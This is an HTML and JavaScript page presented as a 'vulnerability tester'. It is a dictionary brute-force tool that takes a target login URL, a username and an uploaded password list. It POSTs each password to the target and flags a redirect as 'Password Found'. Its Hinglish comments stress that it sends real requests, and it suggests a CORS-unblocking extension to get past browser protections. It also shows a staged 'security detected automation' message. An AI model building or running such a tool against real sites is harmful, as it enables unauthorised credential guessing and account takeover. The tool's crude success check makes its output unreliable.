<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Professional Web Auth Tester</title>
    <style>
        :root { --green: #00ff41; --blue: #00d4ff; --red: #ff4d4d; }
        body { font-family: 'Consolas', monospace; background: #0a0a0a; color: white; display: flex; justify-content: center; padding: 20px; }
        .container { background: #111; border: 1px solid #333; padding: 25px; width: 500px; border-radius: 8px; box-shadow: 0 0 25px rgba(0, 212, 255, 0.1); }
        h2 { color: var(--blue); text-align: center; font-size: 1.1rem; border-bottom: 1px solid #222; padding-bottom: 15px; margin-top: 0; }
        label { font-size: 0.75rem; color: #777; display: block; margin-top: 10px; }
        input { width: 100%; padding: 10px; margin: 5px 0; background: #000; border: 1px solid #444; color: var(--green); border-radius: 4px; box-sizing: border-box; }
        .controls { display: flex; gap: 10px; margin-top: 15px; }
        button { flex: 1; padding: 12px; border: none; cursor: pointer; font-weight: bold; border-radius: 4px; transition: 0.2s; }
        .start-btn { background: var(--blue); color: black; }
        .stop-btn { background: var(--red); color: white; display: none; }
        #console-output { background: #000; height: 200px; overflow-y: auto; margin-top: 15px; padding: 12px; font-size: 0.8rem; border: 1px solid #222; color: #aaa; border-left: 3px solid var(--blue); }
        .success-text { color: var(--green); font-weight: bold; }
        .fail-text { color: #555; }
    </style>
</head>
<body>

<div class="container">
    <h2>VULNERABILITY TESTER v5.0</h2>
    
    <label>TARGET WEBSITE LOGIN URL</label>
    <input type="text" id="target-url" value="https://example.com/login" placeholder="https://site.com/login">
    
    <label>USERNAME</label>
    <input type="text" id="target-user" placeholder="admin">

    <label>UPLOAD DICTIONARY (.TXT)</label>
    <input type="file" id="wordlist" accept=".txt">

    <div class="controls">
        <button id="start" class="start-btn" onclick="executeAttack()">START REAL TEST</button>
        <button id="stop" class="stop-btn" onclick="stopAttack()">STOP TEST</button>
    </div>

    <div id="console-output">> Ready for Deployment...</div>
</div>

<script>
    let isRunning = false;
    let dictionary = [];

    // Loading passwords from file
    document.getElementById('wordlist').onchange = function(e) {
        const reader = new FileReader();
        reader.onload = function() {
            dictionary = this.result.split(/\r?\n/).filter(line => line.trim() !== "");
            log(`> Wordlist initialized: ${dictionary.length} passwords loaded.`);
        };
        reader.readAsText(e.target.files[0]);
    };

    function log(msg, colorClass = "") {
        const output = document.getElementById('console-output');
        output.innerHTML += `<div class="${colorClass}">${msg}</div>`;
        output.scrollTop = output.scrollHeight;
    }

    async function executeAttack() {
        const url = document.getElementById('target-url').value;
        const user = document.getElementById('target-user').value;
        const startBtn = document.getElementById('start');
        const stopBtn = document.getElementById('stop');

        if (!url || !user || dictionary.length === 0) {
            alert("Sabhi fields bharein aur wordlist upload karein!");
            return;
        }

        isRunning = true;
        startBtn.style.display = 'none';
        stopBtn.style.display = 'block';
        log(`> Initiating request to: ${url}`, "success-text");

        for (let i = 0; i < dictionary.length; i++) {
            if (!isRunning) break;

            let currentPass = dictionary[i];
            log(`[${i+1}] Trying: ${currentPass}`);

            try {
                // REAL FETCH LOGIC: Yeh website par actual data bhej raha hai
                const response = await fetch(url, {
                    method: 'POST',
                    mode: 'cors', // Browser security check
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `username=${encodeURIComponent(user)}&password=${encodeURIComponent(currentPass)}`
                });

                // Check Response: Agar website 200 OK bhejti hai toh success
                // Note: Real world mein success check karna depend karta hai site ke response message par
                if (response.status === 200 && response.redirected) {
                    log(`> [SUCCESS] Password Found: ${currentPass}`, "success-text");
                    isRunning = false;
                    break;
                } else {
                    log(`> [FAILED] Server returned status: ${response.status}`, "fail-text");
                }

            } catch (err) {
                // Agar CORS Error aaye (Jo ki security ki wajah se aayega)
                log(`> [NETWORK ERROR] Blocked by security policy (CORS).`, "fail-text");
                log(`> Tip: Use a CORS Unblocker extension for real testing.`, "success-text");
                
                // Demo purpose: Agar error aaya toh hum sirf 50 attempts dikhakar demo de sakte hain
                if(i > 20) {
                    log(`> [!] Demo Alert: Website security detected automation.`, "fail-text");
                    break;
                }
            }

            // Speed: Real websites ke liye thoda delay zaroori hai
            await new Promise(r => setTimeout(r, 800)); 
        }

        stopAttack();
    }

    function stopAttack() {
        isRunning = false;
        document.getElementById('start').style.display = 'block';
        document.getElementById('stop').style.display = 'none';
        log("> Session Terminated.");
    }
</script>

</body>
</html>
